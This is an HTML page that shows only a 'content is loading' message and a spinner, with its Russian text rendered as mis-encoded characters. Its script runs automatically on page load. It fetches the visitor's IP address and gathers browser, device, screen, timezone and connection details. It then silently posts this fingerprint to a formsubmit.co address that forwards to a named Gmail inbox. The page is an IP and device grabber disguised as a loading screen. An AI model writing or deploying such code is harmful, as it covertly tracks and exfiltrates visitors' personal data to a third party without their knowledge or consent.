<body>

    <p>–ò–¥—ë—Ç –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞...</p>
    <div class="loader"></div>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        function collectAllData(ip) {

            const browserInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'unknown'
            };

            // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —ç–∫—Ä–∞–Ω–µ
            const screenInfo = {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            };

            // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ (–ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω–æ–µ –ø–æ IP)
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const locale = Intl.DateTimeFormat().resolvedOptions().locale;

            // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
            const connectionInfo = {
                downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
                effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
                saveData: navigator.connection ? navigator.connection.saveData : 'unknown'
            };

            // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            const fullMessage = `
üöÄ –ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨ üöÄ

üìç IP –ê–î–†–ï–°: ${ip}

üåç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø:
‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${timezone}
‚Ä¢ –õ–æ–∫–∞–ª—å: ${locale}

üíª –°–ò–°–¢–ï–ú–ê –ò –ë–†–ê–£–ó–ï–†:
‚Ä¢ User Agent: ${browserInfo.userAgent}
‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${browserInfo.platform}
‚Ä¢ –Ø–∑—ã–∫: ${browserInfo.language}
‚Ä¢ –î–æ—Å—Ç—É–ø–Ω—ã–µ —è–∑—ã–∫–∏: ${browserInfo.languages}
‚Ä¢ –ö—É–∫–∏ –≤–∫–ª—é—á–µ–Ω—ã: ${browserInfo.cookieEnabled}
‚Ä¢ Java –≤–∫–ª—é—á–µ–Ω–∞: ${browserInfo.javaEnabled}
‚Ä¢ PDF –ø—Ä–æ—Å–º–æ—Ç—Ä: ${browserInfo.pdfViewerEnabled}
‚Ä¢ –Ø–¥–µ—Ä CPU: ${browserInfo.hardwareConcurrency}
‚Ä¢ –ü–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${browserInfo.deviceMemory} GB
‚Ä¢ –¢–∞—á-–ø–æ–∏–Ω—Ç—ã: ${browserInfo.maxTouchPoints}

üñ• –≠–ö–†–ê–ù:
‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${screenInfo.width}x${screenInfo.height}
‚Ä¢ –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞: ${screenInfo.colorDepth} bit
‚Ä¢ –ì–ª—É–±–∏–Ω–∞ –ø–∏–∫—Å–µ–ª–µ–π: ${screenInfo.pixelDepth} bit
‚Ä¢ –î–æ—Å—Ç—É–ø–Ω–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${screenInfo.availWidth}x${screenInfo.availHeight}

üì° –°–û–ï–î–ò–ù–ï–ù–ò–ï:

‚Ä¢ –¢–∏–ø —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ${connectionInfo.effectiveType}
‚Ä¢ RTT: ${connectionInfo.rtt} ms
‚Ä¢ –≠–∫–æ–Ω–æ–º–∏—è —Ç—Ä–∞—Ñ–∏–∫–∞: ${connectionInfo.saveData}

‚è∞ –í–†–ï–ú–Ø –ü–û–°–ï–©–ï–ù–ò–Ø: ${new Date().toLocaleString('ru-RU')}
            `;

            return fullMessage;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ –ø–æ—á—Ç—É
        function sendDataToEmail(data) {
            const formData = new FormData();
            formData.append('message', data);
            formData.append('_subject', 'üö® –ü–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—è!');
            formData.append('_captcha', 'false');
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ fetch –±–µ–∑ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            fetch('https://formsubmit.co/wplacesosi1@gmail.com', {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            });
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        function collectAndSendData() {
            // –ü–æ–ª—É—á–∞–µ–º IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
                    const allData = collectAllData(ipData.ip);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –ø–æ—á—Ç—É
                    sendDataToEmail(allData);
                })
                .catch(error => {

                    const fallbackData = collectAllData('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP');
                    sendDataToEmail(fallbackData);
                });
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', collectAndSendData);
    </script>
